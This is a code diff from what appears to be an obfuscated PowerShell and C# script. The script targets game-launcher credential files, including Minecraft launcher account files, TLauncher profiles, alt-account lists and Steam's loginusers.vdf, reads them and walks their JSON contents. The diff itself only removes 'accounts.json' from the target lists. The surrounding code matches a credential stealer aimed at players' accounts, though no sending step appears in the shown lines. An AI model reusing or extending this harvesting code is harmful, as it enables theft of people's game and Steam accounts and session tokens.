@@ -51,7 +51,7 @@ using System.Text.RegularExpressions;
 public static class YA
 {
     static readonly HashSet<string> Names = new HashSet<string>(StringComparer.OrdinalIgnoreCase) {
-        "latest.log", "debug.log", "launcher_accounts.json", "accounts.json",
+        "latest.log", "debug.log", "launcher_accounts.json",
         "accounts.microsoft.json", "tlauncher_profiles.json",
         "accounts_v1.do_not_send_to_anyone", "aoba_alts.json", "loginusers.vdf"
     };
@@ -362,7 +362,7 @@ function Walk-Json($bkb, $mkb) {
     elseif ($bkb -is [System.Array]) { foreach ($smoke in $bkb) { Walk-Json $smoke $mkb } }
 }
 
-foreach ($cringe in ($kapec | Where-Object { [IO.Path]::GetFileName($_) -in 'launcher_accounts.json', 'accounts.json', 'accounts.microsoft.json', 'tlauncher_profiles.json', 'aoba_alts.json' })) {
+foreach ($cringe in ($kapec | Where-Object { [IO.Path]::GetFileName($_) -in 'launcher_accounts.json', 'accounts.microsoft.json', 'tlauncher_profiles.json', 'aoba_alts.json' })) {
     $bot = [YA]::ReadText($cringe)
     if (-not $bot) { continue }
     try { Walk-Json ($bot | ConvertFrom-Json) $cringe } catch { }
